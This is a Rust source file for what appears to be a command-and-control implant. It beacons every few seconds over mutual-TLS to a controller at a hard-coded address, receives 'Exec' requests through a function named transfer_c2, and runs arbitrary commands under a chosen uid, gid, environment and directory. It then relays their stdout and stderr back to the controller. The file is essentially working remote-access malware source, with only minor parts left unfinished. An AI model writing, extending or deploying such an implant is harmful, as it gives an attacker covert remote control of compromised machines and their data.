#![feature(random)]
use std::{
    collections::{hash_map::Entry, HashMap},
    fs::{self, File},
    io::{self, Read, Write},
    net::{TcpStream, ToSocketAddrs},
    os::unix::process::CommandExt,
    process::{ChildStderr, ChildStdin, ChildStdout},
    random::random,
    sync::{
        mpsc::{Receiver, SendError, Sender, TryRecvError},
        Mutex,
    },
    thread,
    time::Duration,
};

use proto::{
    request::{self, ReadAmount, Request},
    response::{self, Response},
};
use rustls::{
    pki_types::{pem::PemObject, CertificateDer, PrivateKeyDer, ServerName},
    ClientConfig, ClientConnection, RootCertStore,
};

type Handles = Mutex<HashMap<u64, Handle>>;

fn main() {
    let ca_cert = fs::read("./crypto/ca.crt").unwrap().leak();
    let client_cert = fs::read("./crypto/client.crt").unwrap().leak();
    let client_key = fs::read("./crypto/client.key").unwrap().leak();

    let Ok((tx, rx)) = start_callback(
        "lp",
        Duration::from_secs(5),
        "localhost:1337",
        ca_cert,
        client_cert,
        client_key,
    ) else {
        return;
    };

    let handles: Handles = Mutex::new(HashMap::new());

    while let Ok(Request { session, seq, req }) = rx.recv() {
        if let Err(e) = match req {
            request::RequestType::Exec(exec) => {
                println!("Got Exec");
                do_exec(exec, session, seq, &handles, tx.clone())
            }
            request::RequestType::Read(read) => {
                println!("Got Read");
                do_read(read, session, seq, &handles, tx.clone())
            }
            _ => {
                println!("Unsupported type");
                continue;
            }
        } {
            break;
        }
    }
}
fn do_exec(
    exec: request::Exec,
    session: u64,
    seq: u64,
    handles: &Handles,
    tx: Sender<response::Response>,
) -> Result<(), SendError<response::Response>> {
    let request::Exec {
        command,
        args,
        env,
        current_dir,
        uid,
        gid,
    } = exec;
    let mut command = std::process::Command::new(command);
    command.args(args);

    for env_action in env {
        match env_action {
            request::Env::Clear => command.env_clear(),
            request::Env::Delete(key) => command.env_remove(key),
            request::Env::Add((key, val)) => command.env(key, val),
            request::Env::Append((key, val)) => {
                let mut new_val = std::env::var(&key).unwrap_or_default();
                new_val.push_str(&val);
                command.env(key, new_val)
            }
        };
    }

    if let Some(current_dir) = current_dir {
        command.current_dir(current_dir);
    }
    if let Some(gid) = gid {
        command.gid(gid);
    }

    if let Some(uid) = uid {
        command.uid(uid);
    }

    match command.spawn() {
        Ok(mut child) => {
            let mut handles = handles.lock().unwrap();
            if let Some(stdout) = child.stdout.take() {
                let id: u64 = random(..);
                handles.insert(id, stdout.into());
                tx.send(Response {
                    session,
                    seq,
                    res: response::ResponseType::NewHandle(response::NewHandle {
                        note: "stdout".to_owned(),
                        id,
                    }),
                })
                .unwrap();
            }
            if let Some(stdin) = child.stdin.take() {
                let id: u64 = random(..);
                handles.insert(id, stdin.into());
                tx.send(Response {
                    session,
                    seq,
                    res: response::ResponseType::NewHandle(response::NewHandle {
                        note: "stdin".to_owned(),
                        id,
                    }),
                })
                .unwrap();
            }
            if let Some(stderr) = child.stderr.take() {
                let id: u64 = random(..);
                handles.insert(id, stderr.into());
                tx.send(Response {
                    session,
                    seq,
                    res: response::ResponseType::NewHandle(response::NewHandle {
                        note: "stderr".to_owned(),
                        id,
                    }),
                })
                .unwrap();
            }
        }
        Err(err) => todo!(),
    };
    Ok(())
}

fn do_read(
    request::Read { id, ammount }: request::Read,
    session: u64,
    seq: u64,
    handles: &Mutex<HashMap<u64, Handle>>,
    tx: Sender<response::Response>,
) -> Result<(), SendError<response::Response>> {
    let mut handles = handles.lock().unwrap();
    let Entry::Occupied(mut entry) = handles.entry(id) else {
        return tx.send(response::Response {
            session,
            seq,
            res: response::ResponseType::HandleNotFound(id),
        });
    };
    let handle = entry.get_mut();
    match read_data(handle, ammount) {
        Ok(data) => tx.send(Response {
            session,
            seq,
            res: response::ResponseType::Read(response::Read { data }),
        }),
        Err(error) => {
            entry.remove();
            tx.send(Response {
                session,
                seq,
                res: response::ResponseType::Error(error),
            })
        }
    }
}
fn read_data(handle: &mut Handle, ammount: ReadAmount) -> Result<Vec<u8>, String> {
    match ammount {
        request::ReadAmount::End => {
            let mut buf = Vec::new();
            handle.read_to_end(&mut buf).map_err(|e| e.to_string())?;
            Ok(buf)
        }
        request::ReadAmount::Exact(len) => {
            let mut buf = vec![0; len];
            handle.read_exact(&mut buf).map_err(|e| e.to_string())?;
            Ok(buf)
        }
        request::ReadAmount::Some(len) => {
            let mut buf = vec![0; len];
            let r = handle.read(&mut buf).map_err(|e| e.to_string()).unwrap();
            buf.resize(r, 0);
            Ok(buf)
        }
    }
}

enum Handle {
    File(File),
    Socket(TcpStream),
    StdIn(ChildStdin),
    StdOut(ChildStdout),
    StdErr(ChildStderr),
}

impl Read for Handle {
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        match self {
            Handle::File(file) => file.read(buf),
            Handle::Socket(tcp_stream) => tcp_stream.read(buf),
            Handle::StdIn(_) => Err(io::ErrorKind::Other.into()),
            Handle::StdOut(child_stdout) => child_stdout.read(buf),
            Handle::StdErr(child_stderr) => child_stderr.read(buf),
        }
    }
}

impl Write for Handle {
    fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
        match self {
            Handle::File(file) => file.write(buf),
            Handle::Socket(tcp_stream) => tcp_stream.write(buf),
            Handle::StdIn(child_stdin) => child_stdin.write(buf),
            Handle::StdOut(_) => Err(io::ErrorKind::Other.into()),
            Handle::StdErr(_) => Err(io::ErrorKind::Other.into()),
        }
    }

    fn flush(&mut self) -> io::Result<()> {
        todo!()
    }
}

impl From<ChildStdout> for Handle {
    fn from(value: ChildStdout) -> Self {
        Handle::StdOut(value)
    }
}
impl From<ChildStdin> for Handle {
    fn from(value: ChildStdin) -> Self {
        Handle::StdIn(value)
    }
}
impl From<ChildStderr> for Handle {
    fn from(value: ChildStderr) -> Self {
        Handle::StdErr(value)
    }
}

#[derive(Debug)]
enum ConnectError {
    NoCerts,
    InvalidServerName,
    BadPem,
    BadConfig,
}

fn start_callback(
    name: &'static str,
    sleep: Duration,
    upstream_addr: impl ToSocketAddrs + Send + 'static,
    ca_cert: &'static [u8],
    client_cert: &'static [u8],
    client_key: &'static [u8],
) -> Result<(Sender<response::Response>, Receiver<request::Request>), ConnectError> {
    let (res_tx, res_rx) = std::sync::mpsc::channel();
    let (req_tx, req_rx) = std::sync::mpsc::channel();
    thread::spawn(move || -> Result<(), ConnectError> {
        let mut error_count = 0;
        'main: loop {
            thread::sleep(sleep);
            let mut responses = Vec::new();
            'recv: loop {
                match res_rx.try_recv() {
                    Ok(v) => responses.push(v),
                    Err(TryRecvError::Empty) => break 'recv,
                    Err(TryRecvError::Disconnected) => break 'main,
                }
            }
            let mut ctx = setup_ctx(name, ca_cert, client_cert, client_key)?;
            match transfer_c2(&mut ctx, responses, &upstream_addr) {
                Ok(requests) => {
                    for req in requests {
                        if let Err(_) = req_tx.send(req) {
                            break 'main;
                        };
                    }
                    error_count = 0;
                }
                Err(_) => {
                    error_count += 1;
                    if error_count > 5 {
                        break 'main;
                    }
                    continue;
                }
            };
        }
        Ok(())
    });
    Ok((res_tx, req_rx))
}

fn setup_ctx(
    name: &'static str,
    ca_cert: &[u8],
    client_cert: &[u8],
    client_key: &[u8],
) -> Result<ClientConnection, ConnectError> {
    let mut store = RootCertStore::empty();
    store
        .add(CertificateDer::from_pem_slice(ca_cert).or(Err(ConnectError::BadPem))?)
        .or(Err(ConnectError::NoCerts))?;
    let config = ClientConfig::builder()
        .with_root_certificates(store)
        .with_client_auth_cert(
            vec![CertificateDer::from_pem_slice(client_cert).or(Err(ConnectError::BadPem))?],
            PrivateKeyDer::from_pem_slice(client_key).or(Err(ConnectError::BadPem))?,
        )
        .unwrap();
    let name: ServerName = name.try_into().or(Err(ConnectError::InvalidServerName))?;
    let ctx = ClientConnection::new(config.into(), name).or(Err(ConnectError::BadConfig))?;
    Ok(ctx)
}

fn transfer_c2(
    ctx: &mut ClientConnection,
    responses: Vec<response::Response>,
    upstream_addr: impl ToSocketAddrs,
) -> Result<Vec<request::Request>, io::Error> {
    let mut tcp_conn = std::net::TcpStream::connect(&upstream_addr)?;
    tcp_conn.set_read_timeout(Some(Duration::from_secs(10)))?;
    tcp_conn.set_write_timeout(Some(Duration::from_secs(10)))?;

    let mut stream = rustls::Stream::new(ctx, &mut tcp_conn);

    bincode::encode_into_std_write(responses, &mut stream, bincode::config::standard())
        .map_err(io::Error::other)?;
    bincode::decode_from_std_read(&mut stream, bincode::config::standard())
        .map_err(io::Error::other)
}
